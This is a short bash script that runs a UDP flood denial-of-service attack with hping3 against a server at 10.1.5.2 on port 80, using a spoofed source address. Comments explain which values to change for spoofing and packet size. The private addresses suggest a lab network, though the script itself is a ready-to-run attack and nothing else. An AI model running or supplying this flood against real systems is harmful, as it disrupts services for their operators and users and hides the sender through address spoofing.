# !/bin/bash

echo "Starting udp flood attack ..."

sudo hping3 --udp --flood -p 80 --interface eth4 --data 1024 -a 10.1.3.2 10.1.5.2 

echo "Udp flood attack completed"

# 10.1.5.2 is server
# 10.1.3.2 is the src and can be changed IP src addr for spoofing
# 1024 is size of data
